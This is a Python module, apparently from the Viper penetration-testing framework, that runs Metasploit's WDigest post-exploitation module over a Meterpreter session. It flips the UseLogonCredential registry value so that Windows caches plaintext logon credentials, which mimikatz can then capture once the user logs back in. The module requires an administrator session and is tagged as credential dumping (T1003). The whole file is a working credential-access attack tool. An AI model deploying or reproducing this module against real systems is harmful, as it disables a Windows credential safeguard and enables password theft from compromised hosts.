# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows WDigest开关"
    DESC = "用于打开WDigest凭证存储开关,Windows 8/2012以上版本默认关闭Wdigest开关.\n" \
           "通过修改注册表UseLogonCredential值打开开关.\n" \
           "当用户注销重新登录后即可使用mimikatz抓取密码."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    README = ["https://www.yuque.com/vipersec/module/tad836"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/wdigest_caching_api"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)

        if self.session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        if self.session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_good("模块执行成功.")
            self.log_good(f"返回消息: {message}")

        else:
            print_str = "运行失败:{}".format(message)
            self.log_error(print_str)
